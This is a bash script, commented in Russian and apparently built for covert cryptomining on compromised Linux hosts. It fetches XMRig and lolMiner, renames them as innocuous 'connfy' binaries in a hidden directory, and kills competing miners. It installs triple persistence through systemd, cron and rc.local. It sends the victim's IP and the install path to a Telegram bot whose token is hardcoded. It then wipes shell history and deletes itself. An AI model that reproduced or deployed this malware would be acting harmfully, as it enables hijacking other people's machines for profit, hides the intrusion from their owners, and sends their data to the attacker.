#!/bin/bash

# ============================================================
# |GOD MODE/ v6: TRIPLE LAYER PERSISTENCE                   |
# |      SYSTEMD + CRON + RC.LOCAL // CLEAN & ROBUST        |
# ============================================================

# [ ⚙️ НАСТРОЙКИ ]
FIXED_WALLET_ID="krxYNV2DZQ"
TG_BOT_TOKEN="8329784400:AAEtzySm1UTFIH-IqhAMUVNL5JLQhTlUOGg"
TG_CHAT_ID="7032066912"

# [ ПУЛЫ ]
POOL_CPU_1="xmr.kryptex.network:7777"
POOL_CPU_2="xmr-eu.kryptex.network:7777"
POOL_GPU_1="etc.kryptex.network:7033"
POOL_GPU_2="etc-eu.kryptex.network:7033"

# [ ДИРЕКТОРИЯ ]
# Используем /usr/local/bin для рута (классика) или home для юзера
if [ "$(id -u)" -eq 0 ]; then
    BASE_DIR="/usr/local/bin/.connfy-core"
    IS_ROOT=1
else
    BASE_DIR="$HOME/.connfy-core"
    IS_ROOT=0
fi

BIN_CPU="connfy_manager" 
BIN_GPU="connfy_render"

# [ ССЫЛКИ ]
URL_XMRIG="https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
URL_LOLMINER="https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz"

# ----------------------------------------------------
# [ ФАЗА 1: ПОДГОТОВКА ]
# ----------------------------------------------------

get_worker() {
    local ip=$(curl -s -m 5 ifconfig.me || wget -qO- -t 1 ifconfig.me)
    local safe_ip=$(echo "$ip" | tr -d '.') 
    if [ -z "$safe_ip" ]; then safe_ip="777777"; fi
    echo "${FIXED_WALLET_ID}.${safe_ip}"
}
WORKER=$(get_worker)
mkdir -p "$BASE_DIR"
cd "$BASE_DIR" || exit

# Kill old
pkill -9 -f "xmrig" >/dev/null 2>&1
pkill -9 -f "lolminer" >/dev/null 2>&1
pkill -f "$BIN_CPU" >/dev/null 2>&1
pkill -f "$BIN_GPU" >/dev/null 2>&1

# ----------------------------------------------------
# [ ФАЗА 2: ЗАГРУЗКА ]
# ----------------------------------------------------
echo "[+] Deploying binaries..."

# CPU
if [ ! -f "$BIN_CPU" ]; then
    curl -L -k -s -o cpu.tar.gz "$URL_XMRIG" || wget -qO cpu.tar.gz "$URL_XMRIG"
    tar -xf cpu.tar.gz
    FOUND_CPU=$(find . -type f -name "xmrig" | head -n 1)
    [ -n "$FOUND_CPU" ] && mv "$FOUND_CPU" "./$BIN_CPU" && chmod +x "./$BIN_CPU"
    rm -rf cpu.tar.gz xmrig*
fi

# Config CPU
cat <<EOF > config.json
{
    "api": { "id": null, "worker-id": null },
    "http": { "enabled": false },
    "autosave": true,
    "background": false,
    "colors": false,
    "cpu": { "enabled": true, "huge-pages": true, "asm": true },
    "pools": [
        { "url": "$POOL_CPU_1", "user": "$WORKER", "pass": "x", "keepalive": true },
        { "url": "$POOL_CPU_2", "user": "$WORKER", "pass": "x", "keepalive": true }
    ]
}
EOF

# GPU (Force Download)
if [ ! -f "$BIN_GPU" ]; then
    curl -L -k -s -o gpu.tar.gz "$URL_LOLMINER" || wget -qO gpu.tar.gz "$URL_LOLMINER"
    tar -xf gpu.tar.gz
    FOUND_GPU=$(find . -type f -name "lolMiner" | head -n 1)
    [ -n "$FOUND_GPU" ] && mv "$FOUND_GPU" "./$BIN_GPU" && chmod +x "./$BIN_GPU"
    rm -rf gpu.tar.gz 1.98a
fi

# ----------------------------------------------------
# [ ФАЗА 3: СКРИПТЫ ЗАПУСКА ]
# ----------------------------------------------------

# Main Runner (объединяет запуск)
cat <<EOF > start.sh
#!/bin/bash
cd $BASE_DIR
# Запуск CPU
if ! pgrep -f "$BIN_CPU" > /dev/null; then
    nohup ./$BIN_CPU --config=config.json >/dev/null 2>&1 &
fi
# Запуск GPU (если файл есть)
if [ -f "./$BIN_GPU" ]; then
    if ! pgrep -f "$BIN_GPU" > /dev/null; then
       nohup ./$BIN_GPU --algo ETC --pool $POOL_GPU_1 --user $WORKER --pool $POOL_GPU_2 --user $WORKER --nocolor --watchdog exit >/dev/null 2>&1 &
    fi
fi
EOF
chmod +x start.sh

# Запускаем прямо сейчас
./start.sh

# ----------------------------------------------------
# [ ФАЗА 4: МНОГОУРОВНЕВАЯ ЖИВУЧЕСТЬ ]
# ----------------------------------------------------
PERSIST_LOG=""

# 1. SYSTEMD (Только Root)
if [ "$IS_ROOT" -eq 1 ] && [ -d "/run/systemd/system" ]; then
    cat <<EOF > /etc/systemd/system/connfy-srv.service
[Unit]
Description=Connfy Service
After=network.target
[Service]
ExecStart=$BASE_DIR/start.sh
Type=forking
Restart=always
User=root
[Install]
WantedBy=multi-user.target
EOF
    systemctl enable connfy-srv >/dev/null 2>&1
    systemctl start connfy-srv
    PERSIST_LOG="${PERSIST_LOG} [Systemd]"
fi

# 2. CRONTAB (Root & User)
if command -v crontab >/dev/null 2>&1; then
    (crontab -l 2>/dev/null | grep -v "$BASE_DIR/start.sh"; echo "@reboot $BASE_DIR/start.sh") | crontab -
    # Добавляем ежечасную проверку (Watchdog), если процесс умер
    (crontab -l 2>/dev/null | grep -v "start.sh"; echo "0 * * * * $BASE_DIR/start.sh") | crontab -
    PERSIST_LOG="${PERSIST_LOG} [Cron+Watchdog]"
fi

# 3. RC.LOCAL (Legacy Root)
if [ "$IS_ROOT" -eq 1 ] && [ -f "/etc/rc.local" ]; then
    # Проверяем, есть ли уже запись
    if ! grep -q "$BASE_DIR/start.sh" /etc/rc.local; then
        # Вставляем перед exit 0, если он есть
        sed -i -e '$i '"$BASE_DIR/start.sh &" /etc/rc.local 2>/dev/null || echo "$BASE_DIR/start.sh &" >> /etc/rc.local
        chmod +x /etc/rc.local
        PERSIST_LOG="${PERSIST_LOG} [rc.local]"
    fi
fi

# ----------------------------------------------------
# [ ФИНАЛ ]
# ----------------------------------------------------
MSG="💉 <b>GOD MODE: INJECTED</b> %0A🆔 <b>ID:</b> $WORKER%0A🛡 <b>Persist:</b> $PERSIST_LOG%0A📂 <b>Path:</b> $BASE_DIR"
curl -s -X POST "https://api.telegram.org/bot$TG_BOT_TOKEN/sendMessage" -d chat_id="$TG_CHAT_ID" -d text="$MSG" -d parse_mode="HTML" > /dev/null 2>&1

history -c
rm -f "$0"
